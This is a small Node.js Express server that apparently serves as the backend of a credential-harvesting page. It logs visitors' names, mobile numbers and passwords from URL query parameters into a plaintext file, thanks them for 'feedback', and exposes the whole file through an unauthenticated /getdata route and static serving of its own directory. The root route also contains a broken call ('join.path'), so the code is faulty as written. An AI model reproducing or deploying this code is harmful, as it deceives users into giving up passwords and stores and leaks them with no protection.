const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const port = 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname))); 


app.get('/', (req, res) => {
  res.sendFile(join.path(__dirname, 'index.html'));
});

app.get('/data', (req, res) => {
    fs.appendFile('data.txt', `\n${req.query.name},Mobile: ${req.query.mobile},Password: ${req.query.password}`, (err) => {})
    res.send(
      " Thank you for your feedback!!"
    );
});


app.get('/getdata', (req, res) => {
    fs.readFile('data.txt', 'utf8', (err, data) => {
        res.send(data);
    });
})


app.listen(port, () => { 
    console.log(`Server is running on port ${port}`);
});
